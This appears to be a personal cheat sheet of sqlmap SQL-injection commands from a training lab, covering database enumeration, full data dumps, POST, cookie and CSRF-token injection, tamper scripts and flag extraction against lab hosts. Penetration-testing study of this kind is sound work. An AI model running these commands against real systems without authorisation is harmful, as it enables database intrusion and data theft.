--batch --dump for output on the screen
use burpesuite to copy POST requests into a req.txt then use sql -r req.txt

use the option below to parse the DBMS error
--parse-errors 

-t /tmp/traffic.txt to store the content of the output

The '--all' switch in combination with the '--batch' switch, will automa(g)ically do the whole enumeration process on the target itself, and provide the entire enumeration details.

enumeration
--banner
--current-user
--current-db
--schema
```
sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba
```

Table enumeration

```
sqlmap -u "http://www.example.com/?id=1" --tables -D testdb
```

--dump-all --exclude-sysdbs


```
sqlmap -u "http://www.example.com/vuln.php?id=1" --batch
```


```
sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1'
```

sqlmap with a post type on id=1
```
sqlmap -u "http://94.237.49.182:51096/case2.php" --data 'id=1*'  --batch --dump

```

```
sqlmap -u "http://94.237.49.182:51096/case3.php" --cookie='id=1*' --dump --batch

```


```
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
```

```
sqlmap -u 'http://83.136.253.251:45484/case7.php?id=1' --union-cols=5 --dump --no-cast -T flag7

```

--csrf-token
```
sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"

```


```
sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch -v 5 | grep URI
```

MD5 hash
```
sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5 | grep URI
```

```
sqlmap -r req.txt --batch -T 'final_flag' --dump --no-cast --tamper=between

```